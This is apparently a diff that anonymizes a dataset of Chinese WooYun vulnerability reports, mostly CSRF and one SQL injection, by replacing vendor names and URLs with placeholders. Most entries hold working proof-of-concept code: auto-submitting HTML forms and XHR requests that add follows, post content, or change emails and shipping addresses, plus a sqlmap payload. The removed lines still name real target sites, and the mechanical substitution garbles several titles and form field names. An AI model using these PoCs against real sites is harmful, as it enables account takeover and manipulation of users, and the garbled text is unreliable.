 
 ---
-### [wooyun-2013-026269] 腾讯微博csrf可构造蠕虫
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-026269] 某互联网公司某社交平台csrf可构造蠕虫
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -2457,7 +2457,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 依然是t.hk.qq.com1.直接发布一条微博并抓包得到如下数据；POST /index.php/index/t/add HTTP/1.1Host: t.hk.qq.comProxy-Connection: keep-aliveContent-Length: 776Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: http://t.hk.qq.comUser-Agent:Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydAxCJafTU9L2NcZDReferer: http://t.hk.qq.com/index.php/u/littlebirbAc
+**详情**: 依然是t.hk.某互联网公司.com1.直接发布一条某社交平台并抓包得到如下数据；POST /index.php/index/t/add HTTP/1.1Host: t.hk.某互联网公司.comProxy-Connection: keep-aliveContent-Length: 776Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: https://example.com/[已脱敏] multipart/form-data; boundary=----WebKitFormBoundarydAxCJafTU9L2NcZDReferer: https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -2481,7 +2481,7 @@
 
 **详情**: 关注就一个addfollow函数，简单的用户id和用户名post的数据非常简单
 
-**POC**: <html><body><form name="addfollow" action="http://me.qidian.com/ajax/follow.ashx" method="post"><input name="ajaxMethod" value="addfollow" /><input name="followingId" value="2263635" /></form><script>document.addfollow.submit();</script></body></html>我关注的：打开poc页面：利用成功：
+**POC**: <html><body><form name="addfollow" action="https://example.com/[已脱敏]" method="post"><input name="ajaxMethod" value="addfollow" /><input name="followingId" value="2263635" /></form><script>document.addfollow.submit();</script></body></html>我关注的：打开poc页面：利用成功：
 
 **绕过**: 直接利用
 
@@ -2501,13 +2501,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 优酷的绑定微博登陆的请求为http://i.youku.com/partner_thirdPartOnlyBind/tlsite_sina_tlclient_ykwebb此请求并未做csrf防护，攻击者可以在第三方网页中伪造此请求新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过优酷，那么就会自动绑定成功所以我们可以找一个新浪微博登陆的csrf漏洞，让用户自动登陆攻击者的微博（新浪有此类漏洞，这里就不详细写出）然后再让用户访问绑定请求，这样就完成了对攻击者微博的绑定。攻击者使用微博登陆就可以进入用户的优酷账号
+**详情**: 优酷的绑定某社交平台登陆的请求为https://example.com/[已脱敏]
 
-**POC**: 已录视频http://v.youku.com/v_show/id_XMTQxNzEzNjgxNg==.html密码：198625
+**POC**: 已录视频https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 增加csrf防护微博绑定强制使用微博用户名密码登陆
+**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
 ---
 
 ---
@@ -2533,8 +2533,8 @@
 ---
 
 ---
-### [wooyun-2013-021181] 微信公众平台api的几个设计问题
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-021181] 某互联网公司公众平台api的几个设计问题
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -2545,7 +2545,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 如图，给用户单发信息处，没用token，导致csrf。http://mp.weixin.qq.com/cgi-bin/singlesend?t=ajax-response&lang=zh_CN&type=1&content=1111111111&error=false&ajax=1&tofakeid=14****3660前天测试的时候是可以用get方式提交的，现在貌似只能post了，这么快就补了？不过post同样不能防御csrf。但这个csrf价值不大，因为要用到fakeid。同时，api请求没限制频率。两种利用方式：1、给用户发送“微信炸弹”2、突破每天的群发次数限制。我们知道，公众账号是限制了每天只有一次的群发机会，对认证的账号每天有两次。由于没限制频率，导致可突破限制。fakeid可通过修改如下url中pagesize的数量从而使所用用户显示在同一页面来实现批量获取。http://m
+**详情**: 如图，给用户单发信息处，没用token，导致csrf。https://example.com/[已脱敏]
 
 **POC**: 发给一朋友时的测试截图：
 
@@ -2569,7 +2569,7 @@
 
 **详情**: 在www\admin\backup.php：if ($rec == 'backup') {$fileid = isset($_REQUEST['fileid']) ? $_REQUEST['fileid'] : 1;$tables = $_REQUEST['tables'];$vol_size = $_REQUEST['vol_size'];$totalsize = $_REQUEST['totalsize'];$file_name = $_REQUEST['file_name'];  //1、用户输入的文件作为备份文件名// 判断备份文件名是否规范if (!$check->is_backup_file($file_name . '.sql'))  //2、is_backup_file 仅检查是否是字母数字开头、.sql结尾$dou->dou_msg($_LANG['backup_file
 
-**POC**: <html><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><body><form name="csrf" action="http://127.0.0.1/admin/backup.php?rec=backup" method="post"><input type="hidden" name="chkall" value="check"><input type="hidden" name="tables[]" value="dou_admin"><input type="hidden" name="tabl
+**POC**: <html><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><body><form name="csrf" action="http://[IP已脱敏] method="post"><input type="hidden" name="chkall" value="check"><input type="hidden" name="tables[]" value="dou_admin"><input type="hidden" name="tabl
 
 **绕过**: 直接利用
 
@@ -2577,8 +2577,8 @@
 ---
 
 ---
-### [wooyun-2015-0111863] 百度贴吧CSRF一枚（专门针对吧主权限的账户）
-**厂商**: 百度 | **年份**: 2015 | **类型**: CSRF
+### [wooyun-2015-0111863] 某搜索引擎贴吧CSRF一枚（专门针对吧主权限的账户）
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入
 
@@ -2589,9 +2589,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先打开一个我有吧主权限的贴吧，抓包查看修改会员名称的数据包如图然后发现是这样向http://tieba.baidu.com/f/bawu/commit/update_member_alias这个链接提交kw和mbr_alias参数，kw是贴吧名称，mbr_alias是要修改的会员名称并没有tbs，所以猜想在外域构造一个表单提交应该算可以csrf的，html代码为<form id="form1" name="form1" method="post" action="http://tieba.baidu.com/f/bawu/commit/update_member_alias"><p>贴吧名称kw：<input type="text" name="kw" id="kw" /></p><p>会员名称mbr_alias：<input type="text" name="mbr_alias" i
+**详情**: 首先打开一个我有吧主权限的贴吧，抓包查看修改会员名称的数据包如图然后发现是这样向https://example.com/[已脱敏] id="form1" name="form1" method="post" action="https://example.com/[已脱敏]"><p>贴吧名称kw：<input type="text" name="kw" id="kw" /></p><p>会员名称mbr_alias：<input type="text" name="mbr_alias" i
 
-**POC**: 我在backtrack这个吧测试了一下。发现可以成功在外域通过表单提交修改。如图之前贴吧会员名称是BT现在填好表单然后提交，返回json数据，错误码为0，根据百度惯例，0都是成功。然后再来backtrack吧看一下果然被修改了
+**POC**: 我在backtrack这个吧测试了一下。发现可以成功在外域通过表单提交修改。如图之前贴吧会员名称是BT现在填好表单然后提交，返回json数据，错误码为0，根据某搜索引擎惯例，0都是成功。然后再来backtrack吧看一下果然被修改了
 
 **绕过**: 直接利用
 
@@ -2611,7 +2611,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在房网注册一个测试用的账号soufunpa6164既然是找csrf   就上信息修改去试试-----------------最后盯上了邮箱绑定那个QQ邮箱试试--------------------然后上代理抓包咦  发现没啥token-------------------------那莫就构建一个网页试试吧既然是自己测试就不那莫麻烦构建了 简便一点就ok了-----------------------------------构建好了  那莫就该测试了我就换个浏览器新建个账号好了然后擦如我刚才构建的网页  结果有门  点击试试咦   一枚csrf到手
+**详情**: 在房网注册一个测试用的账号soufunpa6164既然是找csrf   就上信息修改去试试-----------------最后盯上了邮箱绑定那个某互联网公司邮箱试试--------------------然后上代理抓包咦  发现没啥token-------------------------那莫就构建一个网页试试吧既然是自己测试就不那莫麻烦构建了 简便一点就ok了-----------------------------------构建好了  那莫就该测试了我就换个浏览器新建个账号好了然后擦如我刚才构建的网页  结果有门  点击试试咦   一枚csrf到手
 
 **POC**: 同上
 
@@ -2621,8 +2621,8 @@
 ---
 
 ---
-### [wooyun-2012-05028] 新浪微博自动加关注
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-05028] 某社交平台某社交平台自动加关注
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -2633,9 +2633,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 将自己的网站发表到微博 用户点击后可以自动关注某用户
+**详情**: 将自己的网站发表到某社交平台 用户点击后可以自动关注某用户
 
-**POC**: <form action="http://club.weibo.com/aj_addattSup.php" method="post" id="f"><input name="uids" value="1237949364,2143550005"></form><script>document.getElementById('f').submit();</script>
+**POC**: <form action="https://example.com/[已脱敏]" method="post" id="f"><input name="uids" value="1237949364,2143550005"></form><script>document.getElementById('f').submit();</script>
 
 **绕过**: 直接利用
 
@@ -2643,8 +2643,8 @@
 ---
 
 ---
-### [wooyun-2015-0158328] 百度某站存在SQL注射漏洞ROOT权限
-**厂商**: 百度 | **年份**: 2015 | **类型**: SQL注射漏洞
+### [wooyun-2015-0158328] 某搜索引擎某站存在SQL注射漏洞ROOT权限
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: SQL注射漏洞
 
 **元思考**: 触发信号: 功能测试
 
@@ -2655,7 +2655,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://test.baidu.com/crowdtest/n/userLabel/openPlane (POST)except_label_ids=&YII_CSRF_TOKEN=
+**详情**: https://example.com/[已脱敏] (POST)except_label_ids=&YII_CSRF_TOKEN=
 
 **POC**: ---Parameter: except_label_ids (POST)Type: boolean-based blindTitle: OR boolean-based blind - WHERE or HAVING clausePayload: except_label_ids=-1823) OR 9214=9214 AND (7202=7202&YII_CSRF_TOKEN=b2a372d95b23a82c96b413253c9597a172f31e4c---web application technology: Apacheback-end DBMS: MySQL 5current u
 
@@ -2701,7 +2701,7 @@
 
 **详情**: 漏洞页面:/skywcm/skywcm/bat/cmd.jsp也是搞不懂这里放一个执行SQL到底有什么意义，并且整个后台没有指向这个页面的链接，我就理解为是开发过程中放在这里的一个调试页面吧。可以执行任意SQL语句，但是只会返回"执行成功"或"执行失败“另外，这里存在CSRF漏洞用BurpSuite生成CSRF_POC保存成HTML文件，然后在登陆skywcm后台的情况下点击提交那么，通过任何方式获悉了skywcm后端数据库结构的人，都可以构造一个添加管理员的CSRF表单，里面是添加管理员的SQL语句，然后诱使任何能够登陆后台的用户点击。主注意，这个页面只需要能够登陆后台就可以访问，不需要管理员身份，所以即使是权限很低的用户都可以在这个页面上执行SQL语句
 
-**POC**: <html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="http://www.target.com/skywcm/skywcm/bat/cmd_do.jsp" method="POST"><input type="hidden" name="biz_action" value="3" /><input type="hidden" name="sql" value="select 1 from dual " /><input type="submit" value="Submit requ
+**POC**: <html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="biz_action" value="3" /><input type="hidden" name="sql" value="select 1 from dual " /><input type="submit" value="Submit requ
 
 **绕过**: 直接利用
 
@@ -2721,9 +2721,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 截图将昵称改成admin，将爱奇艺修改昵称的GET包截取下来，模拟GET提交请求，在nickname的值里面就是昵称，昵称前面+空格，就可以随意更改，例如：http://www.iqiyi.com/u/api/user/update_user_info?nickname= admin&antiCsrf=6b6fbbcf98369ceb046c5732cfb16819&callback=window.Q.__callbacks__.cbp73e2g就是在admin前面加了一个空格，结果返回修改成功
+**详情**: 截图将昵称改成admin，将爱奇艺修改昵称的GET包截取下来，模拟GET提交请求，在nickname的值里面就是昵称，昵称前面+空格，就可以随意更改，例如：https://example.com/[已脱敏] admin&antiCsrf=6b6fbbcf98369ceb046c5732cfb16819&callback=window.Q.__callbacks__.cbp73e2g就是在admin前面加了一个空格，结果返回修改成功
 
-**POC**: http://www.iqiyi.com/u/api/user/update_user_info?nickname=【空格+需要改的名称】&antiCsrf=6b6fbbcf98369ceb046c5732cfb16819&callback=window.Q.__callbacks__.cbp73e2g
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2731,8 +2731,8 @@
 ---
 
 ---
-### [wooyun-2014-077635] 中国电信某分站问题(2)平行权限
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-077635] 某运营商某分站问题(2)平行权限
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -2743,7 +2743,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 还是直接上干货。http://ask.zhidao.189.cn/问题描述：可以修改他人的回复。问题URL:GET /updateFaqAnswer.do?answerId=1762678&content=xx随便打开一个问题：查看源码，找到回复内容的answerId，测试的为1762678然后上大招，直接修改get请求的answerId，修改content为修改的内容，发送请求：再刷新下IE，可以看到内容已经被修改了：如果用工具遍历下，把所有回复都修改掉，那问题就严重了。
+**详情**: 还是直接上干货。https://example.com/[已脱敏] /updateFaqAnswer.do?answerId=1762678&content=xx随便打开一个问题：查看源码，找到回复内容的answerId，测试的为1762678然后上大招，直接修改get请求的answerId，修改content为修改的内容，发送请求：再刷新下IE，可以看到内容已经被修改了：如果用工具遍历下，把所有回复都修改掉，那问题就严重了。
 
 **POC**: 见详细说明
 
@@ -2753,7 +2753,7 @@
 ---
 
 ---
-### [wooyun-2013-037429] 搜狐微博可csrf加关注
+### [wooyun-2013-037429] 搜狐某社交平台可csrf加关注
 **厂商**: 搜狐 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
@@ -2765,7 +2765,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: post: http://t.sohu.com/follow/addfollowsact=follow&friendids=998045返回：{"data":{"name":"焦恩俊","cnt":4,"fcnt":1,"followRelation":1},"status":0,"statusText":"操作成功"}
+**详情**: post: https://example.com/[已脱敏]"data":{"name":"焦恩俊","cnt":4,"fcnt":1,"followRelation":1},"status":0,"statusText":"操作成功"}
 
 **POC**: (见原文)
 
@@ -2787,7 +2787,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、网站多处存在csrf漏洞，如修改个人信息，修改收货地址等处，均存在，此处以修改收货地址进行说明： 修改手机地址，抓包拦截：可以看到post内容中无不可预测参数，尝试csrf，构造恶意链接，主要代码如下：xmlhttp.open("POST", "http://www.agehui.com/user.php", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("province=460000000000&city=460100000000&district=460105000000&town=460105002000&village=460105002002&set_defaul
+**详情**: 1、网站多处存在csrf漏洞，如修改个人信息，修改收货地址等处，均存在，此处以修改收货地址进行说明： 修改手机地址，抓包拦截：可以看到post内容中无不可预测参数，尝试csrf，构造恶意链接，主要代码如下：xmlhttp.open("POST", "https://example.com/[已脱敏]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("province=460000000000&city=460100000000&district=460105000000&town=460105002000&village=460105002002&set_defaul
 
 **POC**: 同上
 
@@ -2809,7 +2809,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 改图网修改收货地址处存在csrf。 修改收货地址。抓包：无不可预测参数，根据请求包，构造csrf链接，主要代码：xmlhttp.open("POST", "http://i.yifutu.com/Ajax/space/ManagerAjax.ashx", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("contactid=142623&ajaxType=6&contacter=woo126&provinceid=5&citiid=25&districtid=328&address=hteshteshp&postcode=010000&tel=13111111111&phone01
+**详情**: 改图网修改收货地址处存在csrf。 修改收货地址。抓包：无不可预测参数，根据请求包，构造csrf链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("contactid=142623&ajaxType=6&contacter=woo126&provinceid=5&citiid=25&districtid=328&address=hteshteshp&postcode=010000&tel=13111111111&phone01
 
 **POC**: 同上
 
@@ -2819,7 +2819,7 @@
 ---
 
 ---
-### [wooyun-2013-046399] 搜狐微博CSRF打包
+### [wooyun-2013-046399] 搜狐某社交平台CSRF打包
 **厂商**: 搜狐 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入
@@ -2831,7 +2831,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 最近慢慢从优酷跑到搜狐看视频了，那就来找找问题吧。不看不知道，一看吓一跳啊，搜狐微博已经放弃治疗了吗？一个token也没看到！！故任意一处都存在CSRF，由于是微博，拿几处典型的测试了下。0x01关注CSRF：http://i.sohu.com/a/app/friend/friend/add.do?xpt=emhhb3lhbmxpbmcxMzhAc29odS5jb20%3D&from_type=xpt的值是账号进行base64后的结果，直接打标签打开提交可成功关注。0x02发微博CSRF：写了一个form表单如下：<form name="test" action="http://i.sohu.com/a/app/mblog/save.htm?_input_encode=UTF-8" method="POST"><br>content<input type="text" name="cont
+**详情**: 最近慢慢从优酷跑到搜狐看视频了，那就来找找问题吧。不看不知道，一看吓一跳啊，搜狐某社交平台已经放弃治疗了吗？一个token也没看到！！故任意一处都存在CSRF，由于是某社交平台，拿几处典型的测试了下。0x01关注CSRF：https://example.com/[已脱敏] name="test" action="https://example.com/[已脱敏]" method="POST"><br>content<input type="text" name="cont
 
 **POC**: 同上
 
@@ -2853,7 +2853,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: CSDN通过GET方式给用户发送私信，请求URL的结构为：http://msg.csdn.net/letters/send_message?receiver=jahnng&body=123在恶意网站上使用类似如下代码仿造请求：<img src="http://msg.csdn.net/letters/send_message?receiver=dahaozhao1&body=CSRF" />然后诱导已登录csdn的用户访问恶意网站，则可以成功发送私信
+**详情**: CSDN通过GET方式给用户发送私信，请求URL的结构为：https://example.com/[已脱敏] src="https://example.com/[已脱敏]" />然后诱导已登录csdn的用户访问恶意网站，则可以成功发送私信
 
 **POC**: 恶意网站代码：请求之后状态：csdn上的私信信息：
 
@@ -2875,7 +2875,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这个又有csrf ，又有设计缺陷，慢慢说吧先注册两个测试账号上图测试账号有了，并且资料也有，通过抓包发现修改个人资料是访问如下这个地址，http://www.flyertrip.com/hotels/personalCenter/mydata.php?flag=update&email=test111@test.com&nickname=test111@test.com，参数应该看的懂吧，然后登陆test222账号去访问这个链接之后，test222的资料就会被更改如图本来改改资料倒不是多大问题，问题是，重新登陆一下test222，惊讶发现密码错误，，test111账号密码test111，test222账号test222，怎么会错，我以为输错了，然后把input的type改成text如图好嘛，还是错误，然后没法只有重置了，然而来到重置页面却发现账号不存在。图：，最后得出的结论是通过csrf可
+**详情**: 这个又有csrf ，又有设计缺陷，慢慢说吧先注册两个测试账号上图测试账号有了，并且资料也有，通过抓包发现修改个人资料是访问如下这个地址，https://example.com/[已脱敏]
 
 **POC**: 同上
 
@@ -2897,7 +2897,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: POST /homecp/user/dosetting HTTP/1.1Host: i.emao.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://i.emao.com/homecp/user/userinfoContent-Length: 77Cookie: Hm_l
+**详情**: POST /homecp/user/dosetting HTTP/1.1Host: i.emao.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: https://example.com/[已脱敏] 77Cookie: Hm_l
 
 **POC**: POST /homecp/user/dosetting HTTP/1.1Host: i.emao.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Request
 
@@ -2907,8 +2907,8 @@
 ---
 
 ---
-### [wooyun-2013-021729] 新浪微博某功能控制不严可导致蠕虫
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-021729] 某社交平台某社交平台某功能控制不严可导致蠕虫
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入
 
@@ -2919,7 +2919,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1）存在问题的功能在：lady.weibo.com的评论处；2）点击发布并抓包，得到如下数据；POST /cmnt/submit HTTP/1.1Host: comment5.news.sina.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://slide.eladies.sina.com.cn/fa/slide_3_41261_19668.h
+**详情**: 1）存在问题的功能在：lady.weibo.com的评论处；2）点击发布并抓包，得到如下数据；POST /cmnt/submit HTTP/1.1Host: comment5.news.sina.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -2943,7 +2943,7 @@
 
 **详情**: 中兴商城 www.ztemall.com ，提交重要请求时没有token校验，存在CSRF漏洞
 
-**POC**: 1.右上角个人中心里面的个人信息，修改密码，有奖征集等地方存在CSRF问题，目测其他地方也有问题2.拿有奖征集来举例：3.抓包发现没有防御csrf的token：4.构造自动提交的csrf POC：<html><body><form action="http://www.ztemall.com/%E5%89%8D%E5%8F%B0%E5%95%86%E5%9F%8E%E6%9C%89%E5%A5%96%E5%BE%81%E9%9B%86/%E6%96%B0%E5%A2%9E" method="POST"><input type="hidden" name="联系人姓名" value="WooYu
+**POC**: 1.右上角个人中心里面的个人信息，修改密码，有奖征集等地方存在CSRF问题，目测其他地方也有问题2.拿有奖征集来举例：3.抓包发现没有防御csrf的token：4.构造自动提交的csrf POC：<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="联系人姓名" value="WooYu
 
 **绕过**: 直接利用
 
@@ -2963,7 +2963,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://work.ch.gongchang.com/product/index/del post提交id可任意修改，删除用户发布过的产品。返回现实500，页面里已经删除了该商品，图中是操作之后已经删除的结果其他的增加，修改的地方应该也有csrf，没试，请厂房验证。
+**详情**: https://example.com/[已脱敏] post提交id可任意修改，删除用户发布过的产品。返回现实500，页面里已经删除了该商品，图中是操作之后已经删除的结果其他的增加，修改的地方应该也有csrf，没试，请厂房验证。
 
 **POC**: 页面里已经删除了该商品，图中是操作之后已经删除的结果
 
@@ -2985,7 +2985,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 修改邮箱，不验证原邮箱，直接向新邮箱发送消息发送邮件urlhttp://www.datebao.com/pserson/center/email/send?email=XXXXDCC@163.comget请求方式构造页面xmlhttp.open("GET", "http://www.datebao.com/pserson/center/email/send?email=XXXXDCC@163.com", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded,charset=UTF-8");xmlhttp.send();邮箱换成自己的就好用户在已登录的情况下，点击异常页面后，会向指定邮箱发送修改邮箱的邮件账号A，邮箱点击构造
+**详情**: 修改邮箱，不验证原邮箱，直接向新邮箱发送消息发送邮件urlhttps://example.com/[已脱敏]"GET", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded,charset=UTF-8");xmlhttp.send();邮箱换成自己的就好用户在已登录的情况下，点击异常页面后，会向指定邮箱发送修改邮箱的邮件账号A，邮箱点击构造
 
 **POC**: 如上
 
@@ -3007,7 +3007,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.zhunbai.com/直接无视登陆密码， 账号到手 天下我有POC<html><body><form action="http://www.zhunbai.com/user/info/do/myinfo.html" method="POST"><input type="hidden" name="qq" value="3088828541" /><input type="hidden" name="email" value="3088828541&#64;qq&#46;com" /><input type="hidden" name="realname" value="wangbadan" /><input type="hidden" name="mobile" value="13169670911" /><input type="hidden" name="add
+**详情**: https://example.com/[已脱敏] 账号到手 天下我有POC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="某互联网公司" value="3088828541" /><input type="hidden" name="email" value="3088828541&#64;某互联网公司&#46;com" /><input type="hidden" name="realname" value="wangbadan" /><input type="hidden" name="mobile" value="13169670911" /><input type="hidden" name="add
 
 **POC**: 可通过邮箱找回用户密码，从而达到修改用户密码CSRF 利用好的话很厉害哦
 
@@ -3029,9 +3029,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我的搜狐   http://i.sohu.com/其中有个跟随好友的功能抓包一看，尼玛，是个GET请求，坑爹的还没有token神马的  数据包如下图其中的  xpt=Ymltb2xpdW5pYW5Ac29odS5jb20%3D 通过URL解码 xpt=Ymltb2xpdW5pYW5Ac29odS5jb20=，再对其值base64解码得到受关注者的邮箱 xpt=bimoliunian@sohu.com  WS想法来了，是不是我也马上要有一大批跟随者啦
+**详情**: 我的搜狐   https://example.com/[已脱敏]  数据包如下图其中的  xpt=Ymltb2xpdW5pYW5Ac29odS5jb20%3D 通过URL解码 xpt=Ymltb2xpdW5pYW5Ac29odS5jb20=，再对其值base64解码得到受关注者的邮箱 xpt=bimoliunian@sohu.com  WS想法来了，是不是我也马上要有一大批跟随者啦
 
-**POC**: 构造跟随我的链接：http://i.sohu.com/a/app/friend/friend/add.do?xpt=YmxhY2××××××××××zLmNvbQ%3D%3D&from_type=等待鱼儿上钩吧
+**POC**: 构造跟随我的链接：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3061,8 +3061,8 @@
 ---
 
 ---
-### [wooyun-2013-036610] 百度贴吧某功能CSRF漏洞一处
-**厂商**: 百度 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-036610] 某搜索引擎贴吧某功能CSRF漏洞一处
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -3073,7 +3073,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.存在可csrf的连接：http://duokoo.baidu.com/novel/?R=493&v=2&pageid=E70dlhtt&bck=1386&jump_p_id=M5ht79md&logout=1&uid=4850E0C9145E3CB2EFC9AAE552E0F3F8&netFlag=cmnet&dkfrc=1&usid=12B6E38CACEE17F2B7022F8938B94F91&rdtp=02.现在是登录状态.3.然后我发一个带那连接的图片=_=4.最后F5,刷新一下=_=,就退出登陆了=_=
+**详情**: 1.存在可csrf的连接：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3083,8 +3083,8 @@
 ---
 
 ---
-### [wooyun-2013-043892] 我是如何刷腾讯微博粉丝的
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-043892] 我是如何刷某互联网公司某社交平台粉丝的
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -3097,7 +3097,7 @@
 
 **详情**: 
 
-**POC**: 访问http://mxd.tencent.com/后授权，访问http://1.wctest.sinaapp.com/html/txmxd.html即可
+**POC**: 访问https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3117,9 +3117,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: <html><body><form action="http://zhishangjianzhu.blog.sohu.com/a/app/discuss/save.htm?_input_encode=UTF-8" method="POST"><input type="hidden" name="from" value="oldBlog" /><input type="hidden" name="appid" value="blog" /><input type="hidden" name="discusstype" value="0" /><input type="hidden" name="content" value="aaa" /><input type="hidden" name="itemid" value="310939570" /><input type="hidden" n
+**详情**: <html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="from" value="oldBlog" /><input type="hidden" name="appid" value="blog" /><input type="hidden" name="discusstype" value="0" /><input type="hidden" name="content" value="aaa" /><input type="hidden" name="itemid" value="310939570" /><input type="hidden" n
 
-**POC**: {"code":0,"msg":"保存成功","comment":{"content":"aaa","passport":"Zmx5bml1QHNvaHUuY29t","id":505509840,"createtime":1450701667232,"unick":"123","uavatar":"http://photo.pic.sohu.com/images/oldblog/person/11111.gif","ulink":"http://#######.blog.sohu.com/","topassport":"MTE1MjcxMzAyM0BxcS5jb20=","sname":"#
